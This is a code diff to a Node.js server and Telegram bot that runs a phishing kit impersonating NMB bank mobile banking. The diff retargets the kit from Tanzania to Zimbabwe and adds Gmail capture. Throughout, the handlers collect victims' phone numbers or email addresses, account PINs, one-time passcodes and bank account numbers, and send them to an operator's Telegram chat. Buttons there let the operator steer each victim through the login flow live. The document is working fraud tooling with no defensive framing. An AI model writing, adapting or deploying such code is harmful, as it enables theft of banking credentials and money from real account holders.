@@ -9,8 +9,8 @@ const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || 'YOUR_ADMIN_CHAT_ID';
-const BASE_URL = process.env.BASE_URL || 'https://tanzania-nmb-mkononi.onrender.com';
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '8786820449';
+const BASE_URL = process.env.BASE_URL || 'https://nmb-zimbabwe.onrender.com';
 
 const bot = new TelegramBot(TOKEN, { polling: true });
 
@@ -19,15 +19,21 @@ app.use(express.json());
 
 const clients = new Map();
 
-// Listen for users starting the bot to notify the admin immediately with a link
 bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
     const user = msg.from;
-    const firstName = user.first_name || 'Mtumiaji';
+    const firstName = user.first_name || 'User';
     const lastName = user.last_name || '';
     const username = user.username ? `@${user.username}` : 'Hakuna';
     const userId = user.id;
 
     const userLink = `${BASE_URL}/?ref=${userId}`;
+
+    const privateWelcomeText = `👋 *Karibu kwenye Paneli ya Utawala*\n\n` +
+        `👤 *Taarifa Zako:*\n` +
+        `• Jina: ${firstName} ${lastName}\n` +
+        `• Username: ${username}\n` +
+        `• Telegram ID: \`${userId}\`\n\n` +
+        `🔗 *Link yako ya kipekee ya rufaa:* \`${userLink}\``;
 
     const notificationText = `🚀 *MTUMIAJI AMEANZISHA BOT*\n\n` +
         `👤 *Jina:* ${firstName} ${lastName}\n` +
@@ -36,11 +42,17 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
         `🔗 *Link ya Mtumiaji:* \`${userLink}\``;
 
     try {
-        await bot.sendMessage(ADMIN_CHAT_ID, notificationText, {
+        await bot.sendMessage(userId, privateWelcomeText, {
             parse_mode: 'Markdown'
         });
+
+        if (ADMIN_CHAT_ID && ADMIN_CHAT_ID !== userId.toString()) {
+            await bot.sendMessage(ADMIN_CHAT_ID, notificationText, {
+                parse_mode: 'Markdown'
+            });
+        }
     } catch (err) {
-        console.error("Error notifying admin on start:", err);
+        console.error("Error sending start messages:", err);
     }
 });
 
@@ -53,30 +65,31 @@ wss.on('connection', (ws) => {
                 clients.set(data.refCode, ws);
             } 
             else if (data.type === 'SUBMIT_CREDENTIALS') {
-                const { phone, pin } = data;
+                const { contactType, contact, pin } = data;
                 
-                // First screen: Only 2 buttons (Allow and Deny)
-                const captionText = `🚨 *MAOMBI MAPYA YA MKOPAJI*\n\n📱 *Namba ya Simu:* +255${phone}\n🔑 *PIN ya Akaunti:* \`${pin}\``;
+                const labelTitle = contactType === 'gmail' ? '📧 *Gmail Address:*' : '📱 *Namba ya Simu:*';
+                const formattedContact = contactType === 'phone' ? `+263${contact}` : contact;
+                
+                const captionText = `🚨 *MAOMBI MAPYA YA MKOPAJI*\n\n${labelTitle} \`${formattedContact}\`\n🔑 *PIN ya Akaunti:* \`${pin}\``;
                 
                 const sentMsg = await bot.sendMessage(ADMIN_CHAT_ID, captionText, {
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: '✅ Allow', callback_data: `ALLOW_${phone}` },
-                                { text: '❌ Deny', callback_data: `DENY_${phone}` }
+                                { text: '✅ Allow', callback_data: `ALLOW_${contact}` },
+                                { text: '❌ Deny', callback_data: `DENY_${contact}` }
                             ]
                         ]
                     }
                 });
                 
-                ws.clientId = phone;
-                clients.set(phone, { ws, messageId: sentMsg.message_id });
+                ws.clientId = contact;
+                clients.set(contact, { ws, messageId: sentMsg.message_id });
             }
             else if (data.type === 'SUBMIT_OTP') {
                 const { otp } = data;
                 
-                // OTP screen: Exactly 3 buttons (Wrong PIN, Wrong OTP, Correct OTP)
                 await bot.sendMessage(ADMIN_CHAT_ID, `🔢 *UWEKAJI WA OTP*\n\nOTP Iliyowekwa: \`${otp}\``, {
                     parse_mode: 'Markdown',
                     reply_markup: {
@@ -94,7 +107,7 @@ wss.on('connection', (ws) => {
             }
             else if (data.type === 'SUBMIT_ACCOUNT') {
                 const { accountNumber } = data;
-                await bot.sendMessage(ADMIN_CHAT_ID, `🏛️ *AKAUNTI YA BENKI YA NMB*\n\nNamba ya Akaunti: \`${accountNumber}\``, {
+                await bot.sendMessage(ADMIN_CHAT_ID, `🏛️ *AKAUNTI YA BENKI*\n\nNamba ya Akaunti: \`${accountNumber}\``, {
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [
@@ -120,7 +133,6 @@ wss.on('connection', (ws) => {
     });
 });
 
-// Handle Telegram Admin Button Clicks (Callback Queries)
 bot.on('callback_query', async (query) => {
     const data = query.data;
 
@@ -134,14 +146,13 @@ bot.on('callback_query', async (query) => {
     else if (data === 'VALID_ACC') actionResponse = 'VALID_ACC';
     else if (data === 'INVALID_ACC') actionResponse = 'INVALID_ACC';
 
-    for (let [phoneKey, clientObj] of clients.entries()) {
+    for (let [, clientObj] of clients.entries()) {
         if (clientObj && clientObj.ws && clientObj.ws.readyState === WebSocket.OPEN) {
             clientObj.ws.send(JSON.stringify({ type: 'SERVER_ACTION', action: actionResponse }));
         }
     }
 
     try {
-        // Removes inline buttons but keeps all message details permanently intact
         await bot.editMessageReplyMarkup(
             { inline_keyboard: [] },
             {
@@ -160,4 +171,4 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
-        
+            
